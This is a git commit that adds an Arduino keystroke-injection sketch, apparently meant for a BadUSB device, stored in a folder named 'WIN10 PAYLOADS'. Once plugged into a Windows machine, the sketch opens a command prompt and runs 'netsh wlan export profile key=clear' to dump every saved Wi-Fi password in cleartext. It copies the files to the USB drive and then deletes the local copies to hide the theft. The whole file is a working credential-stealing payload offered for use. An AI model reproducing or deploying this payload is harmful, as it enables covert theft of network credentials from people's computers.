252fb941cd9bcffb41764ca110b47a0474f2b9e7
Nicolò Bernardi <96845504+NicoAndCode@users.noreply.github.com>
2022-04-23 19:17:08 +0200

    Add files via upload

---
+++ WIN10 PAYLOADS/Script/WiFi_KeyList.ino
@@ -0,0 +1,104 @@
+// Generated with <3 by Dckuino.js !
+
+#include "Keyboard.h"
+void typeKey(int key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+void setup(){
+  Keyboard.begin();
+  delay(1000);
+
+  // Code Begins Here
+
+  // ---THIS SCRIPT IS CREATED BY NicoAndCode---
+  // ---THIS SCRIPT CREATES A FOLDER WITH INSIDE THE FILES CONTAINING THE PASSWORDS OF EVERY WI FI NETWORK TO WHICH THE COMPUTER IS CONNECTED----
+  delay(1500);
+
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+
+  Keyboard.print("cmd");
+
+  delay(100);
+
+  typeKey(KEY_RETURN);
+
+  delay(500);
+
+  // ---MOVE TO MAIN DRIVE (C:\>)---
+  Keyboard.print("cd /");
+
+  typeKey(KEY_RETURN);
+
+  delay(250);
+
+  // ---CREATE DIRECTORY---
+  Keyboard.print("mkdir Wifi_key");
+
+  typeKey(KEY_RETURN);
+
+  delay(250);
+
+  // ---MOVE TO DIRECTORY---
+  Keyboard.print("cd Wifi_key");
+
+  typeKey(KEY_RETURN);
+
+  delay(110);
+
+  // ---EXECUTE COMMAND---
+  Keyboard.print("netsh wlan export profile key=clear");
+
+  typeKey(KEY_RETURN);
+
+  delay(150);
+
+  // ---COPY FILE IN YOUR USB---
+  Keyboard.print("xcopy C:\\Wifi_key D:\\");
+
+  typeKey(KEY_RETURN);
+
+  delay(1000);
+
+  // ---RETURN TO MAIN DRIVE---
+  Keyboard.print(" cd /");
+
+  typeKey(KEY_RETURN);
+
+  delay(150);
+
+  // ---REMOVE FILE FROM PC---
+  Keyboard.print("del C:\\Wifi_key");
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  Keyboard.print("S");
+
+  typeKey(KEY_RETURN);
+
+  delay(100);
+
+  // ---REMOVE DIRECTORY FROM PC---
+  Keyboard.print("rmdir C:\\Wifi_key");
+
+  typeKey(KEY_RETURN);
+
+  delay(150);
+
+  Keyboard.print("exit");
+
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* endless loop */
+void loop() {}
